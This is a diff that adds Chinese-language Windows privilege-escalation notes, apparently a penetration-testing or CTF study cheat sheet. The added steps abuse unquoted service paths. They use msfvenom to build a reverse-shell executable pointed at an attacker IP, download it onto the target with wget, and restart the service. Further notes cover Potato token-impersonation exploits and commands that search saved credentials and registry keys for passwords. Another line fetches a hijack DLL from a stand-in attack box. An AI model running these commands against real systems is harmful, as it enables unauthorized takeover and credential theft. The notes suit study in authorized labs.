@@ -158,4 +158,81 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 > wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
 
 
+# 未加引号的服务路径
 
+一个正常程序路径，比如：
+
+```C:\Program Files\topservice folder\subservice subfolder\srvc.exe```
+
+windows读取的应该是```C:\Program Files\topservice folder\subservice subfolder```的```srvc.exe```程序
+
+但是有一种情况是，假如这个路径没有加引号，那么windows对于这个路径的读取处理依次为：
+
+1. C:\Program.exe
+2. C:\Program Files\topservice.exe
+3. C:\Program Files\topservice folder\subservice.exe
+
+即读取最近那个路径的第一个单词的同名exe文件，知道了这一点，如果我们可以将一个可执行文件放在我们知道服务正在寻找的位置，它可能由服务运行。 
+
+此提权需要满足两个条件：
+1. 能够写入路径上的文件夹
+2. 能够重新启动服务
+
+
+下面命令显示运行的服务，打印名称和路径
+> wmic service get name,displayname,pathname,startmode
+
+
+查找服务的二进制程序路径：
+sc qc 服务名称
+
+
+## 利用步骤
+
+1. 生成一个可以利用的二进制反弹shell
+
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.169 LPORT=4444 -f exe > common.exe
+
+2. 在靶机里把该文件下载到可以使用的路径当中
+> wget -O common.exe 10.13.21.169:8000/common.exe
+
+
+3. 重启服务
+> sc start 服务名称
+
+# 令牌模拟
+
+查看本账户权限
+> whoami /priv
+
+根据目标系统的版本、补丁级别和网络连接限制选择：
+ Hot Potato
+ Rotten Potato
+ Lonely Potato
+ Juicy Potato
+
+ 
+# 其他方法
+
+## 定时任务
+
+查看本机定时任务：
+> schtasks
+
+## 密码
+
+寻找包含明文密码的配置或用户生成的文件
+
+## 保存的凭据
+
+列出保存的凭证：
+> cmdkey /list
+
+## 注册表项
+查询可能包含密码的注册表项:
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+
+## 无人参与文件
+
+ Unattend.xml 文件可帮助系统管理员设置 Windows 系统。设置完成后需要将它们删除，但有时可能会在系统上被遗忘。您将在 unattend.xml 文件中找到的内容根据已完成的设置而有所不同。如果您可以在系统上找到它们，则它们值得一读
